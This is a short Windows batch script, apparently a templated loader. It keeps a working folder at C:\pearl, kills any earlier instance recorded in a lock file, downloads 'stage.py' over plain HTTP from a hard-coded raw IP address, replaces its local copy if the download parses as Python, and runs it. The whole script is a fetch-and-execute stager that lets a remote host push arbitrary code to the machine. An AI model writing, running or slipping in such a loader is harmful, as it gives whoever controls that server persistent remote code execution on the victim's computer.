@echo off
setlocal enableextensions
set "B=C:\pearl"
if not exist "%B%" mkdir "%B%"
if exist "%B%\stop.flag" (
  echo sup_exit_stopflag %DATE% %TIME% >>"%B%\sup.log"
  exit /b 0
)
if exist "%B%\stage.lock" (
  set /p OLDPID=<"%B%\stage.lock"
)
if defined OLDPID (
  taskkill /f /pid %OLDPID% >nul 2>&1
  echo sup_takeover oldpid=%OLDPID% %DATE% %TIME% >>"%B%\sup.log"
  del /f /q "%B%\stage.lock" >nul 2>&1
)
echo sup_start_v2 %DATE% %TIME% >>"%B%\sup.log"
set "OUT=%B%\stage.out.%RANDOM%%RANDOM%"
%SystemRoot%\System32\curl.exe -s -m 8 -o "%B%\stage.new" http://217.15.164.237:8000/stage.py
if exist "%B%\stage.new" (
  "@@PY@@" -c "import ast,sys;ast.parse(open(sys.argv[1],encoding='utf-8',errors='replace').read())" "%B%\stage.new" >nul 2>&1
  if not errorlevel 1 (
    copy /y "%B%\stage.new" "%B%\stage.py" >>"%B%\sup.log" 2>&1
    echo sup_selfupdate_ok %DATE% %TIME% >>"%B%\sup.log"
  ) else (
    echo sup_selfupdate_bad %DATE% %TIME% >>"%B%\sup.log"
  )
)
del /f /q "%B%\stage.new" >nul 2>&1
echo sup_pycall out=%OUT% %DATE% %TIME% >>"%B%\sup.log"
"@@PY@@" -u "%B%\stage.py" >>"%OUT%" 2>&1
echo sup_pyexit_%errorlevel% %DATE% %TIME% >>"%B%\sup.log"
